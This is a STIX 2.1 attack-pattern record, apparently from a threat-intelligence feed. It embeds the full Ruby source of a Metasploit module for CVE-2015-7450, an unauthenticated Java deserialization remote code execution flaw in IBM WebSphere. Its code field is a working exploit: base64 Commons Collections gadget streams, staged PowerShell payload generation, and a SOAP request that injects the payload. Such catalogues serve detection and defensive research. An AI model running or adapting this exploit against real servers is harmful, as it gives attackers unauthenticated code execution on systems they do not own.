{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dcd74297-908a-4b75-bb19-54d71e446e52",
    "created": "2024-08-14T16:47:08.143019Z",
    "modified": "2024-08-14T16:47:08.143023Z",
    "name": "\"IBM WebSphere RCE Java Deserialization Vulnerability\"",
    "description": " This module exploits a vulnerability in IBM's WebSphere Application Server. An unsafe deserialization call of unauthenticated Java objects exists to the Apache Commons Collections (ACC) library, which allows remote arbitrary code execution. Authentication is not required in order to exploit this vulnerability.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/ibm_websphere_java_deserialize.rb",
            "external_id": "ibm_websphere_java_deserialize.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-7450"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java"
        },
        {
            "source_name": "reference",
            "url": "http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability"
        },
        {
            "source_name": "reference",
            "url": "https://www.tenable.com/plugins/index.php?view=single&id=87171"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Powershell\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"IBM WebSphere RCE Java Deserialization Vulnerability\",\n      'Description'    => %q{\n        This module exploits a vulnerability in IBM's WebSphere Application Server. An unsafe deserialization\n        call of unauthenticated Java objects exists to the Apache Commons Collections (ACC) library, which allows\n        remote arbitrary code execution. Authentication is not required in order to exploit this vulnerability.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n            'Liatsis Fotios @liatsisfotios'       # Metasploit Module\n\n            # Thanks for helping me:\n            # # # # # # # # # # # #\n\n            # Kyprianos Vasilopoulos @kavasilo    # Implemented and reviewed - Metasploit module\n            # Dimitriadis Alexios @AlxDm_         # Assistance and code check\n            # Kotsiopoulos Panagiotis             # Guidance about Size and Buffer implementation\n        ],\n      'References'     =>\n        [\n            ['CVE', '2015-7450'],\n            ['URL', 'https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java'],\n            ['URL', 'http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability'],\n            ['URL', 'https://www.tenable.com/plugins/index.php?view=single&id=87171']\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n            [ 'IBM WebSphere 7.0.0.0', {} ]\n        ],\n      'DisclosureDate' => '2015-11-06',\n      'DefaultTarget'  => 0,\n      'DefaultOptions' => {\n            'SSL'      => true,\n            'WfsDelay' => 20\n      }))\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'The base IBM\\'s WebSphere SOAP path', '/']),\n      Opt::RPORT('8880')\n    ])\n  end\n\n\n  def exploit\n      # Decode - Generate - Set Payload / Send SOAP Request\n      soap_request(set_payload)\n  end\n\n  def set_payload\n      # CommonCollections1 Serialized Streams\n      ccs_start = \"rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAB0AAZpbnZva2V1cQB+AB4AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQ=\"\n      ccs_end = \"dAAEZXhlY3VxAH4AHgAAAAFxAH4AI3NxAH4AEXNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAEHcIAAAAEAAAAAB4eHZyABJqYXZhLmxhbmcuT3ZlcnJpZGUAAAAAAAAAAAAAAHhwcQB+ADo=\"\n\n      # Generate Payload\n      payload_exec = invoke_ccs(ccs_start) + gen_payload + invoke_ccs(ccs_end)\n      payload_exec = Rex::Text.encode_base64(payload_exec)\n  end\n\n  def invoke_ccs(serialized_stream)\n      # Decode Serialized Streams\n      serialized_stream = Rex::Text.decode_base64(serialized_stream)\n  end\n\n  def gen_payload\n      # Staging Native Payload\n      exec_cmd = cmd_psh_payload(payload.encoded, payload_instance.arch.first)\n      exec_cmd = exec_cmd.gsub(\"%COMSPEC% /b /c start /b /min \", \"\")\n\n      # Size up RCE - Buffer\n      cmd_lng = exec_cmd.length\n      lng2str = \"0\" + cmd_lng.to_s(16)\n      buff = [lng2str].pack(\"H*\")\n\n      rce_pld = buff + exec_cmd\n  end\n\n  def soap_request(inject_payload)\n      # SOAP Request\n      req = \"<?xml version='1.0' encoding='UTF-8'?>\" + \"\\r\\n\"\n      req += \"<SOAP-ENV:Envelope xmlns:SOAP-ENV=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xmlns:xsd=\\\"http://www.w3.org/2001/XMLSchema\\\">\" + \"\\r\\n\"\n      req += \"<SOAP-ENV:Header xmlns:ns0=\\\"admin\\\" ns0:WASRemoteRuntimeVersion=\\\"7.0.0.0\\\" ns0:JMXMessageVersion=\\\"1.0.0\\\" ns0:SecurityEnabled=\\\"true\\\" ns0:JMXVersion=\\\"1.2.0\\\">\" + \"\\r\\n\"\n      req += \"<LoginMethod>BasicAuth</LoginMethod>\" + \"\\r\\n\"\n      req += \"</SOAP-ENV:Header>\" + \"\\r\\n\"\n      req += \"<SOAP-ENV:Body>\" + \"\\r\\n\"\n      req += \"<ns1:getAttribute xmlns:ns1=\\\"urn:AdminService\\\" SOAP-ENV:encodingStyle=\\\"http://schemas.xmlsoap.org/soap/encoding/\\\">\" + \"\\r\\n\"\n      req += \"<objectname xsi:type=\\\"ns1:javax.management.ObjectName\\\">\" + inject_payload + \"</objectname>\" + \"\\r\\n\"\n      req += \"<attribute xsi:type=\\\"xsd:string\\\">ringBufferSize</attribute>\" + \"\\r\\n\"\n      req += \"</ns1:getAttribute>\" + \"\\r\\n\"\n      req += \"</SOAP-ENV:Body>\" + \"\\r\\n\"\n      req += \"</SOAP-ENV:Envelope>\" + \"\\r\\n\"\n\n      uri = target_uri.path\n\n      res = send_request_raw({\n          'method'      => 'POST',\n          'version'     => '1.1',\n          'raw_headers' => \"Content-Type: text/xml; charset=utf-8\" + \"\\r\\n\" + \"SOAPAction: \\\"urn:AdminService\\\"\" + \"\\r\\n\",\n          'uri'         => normalize_uri(uri),\n          'data'        => req\n      })\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-11-06",
    "x_mitre_platforms": [
        "win'"
    ]
}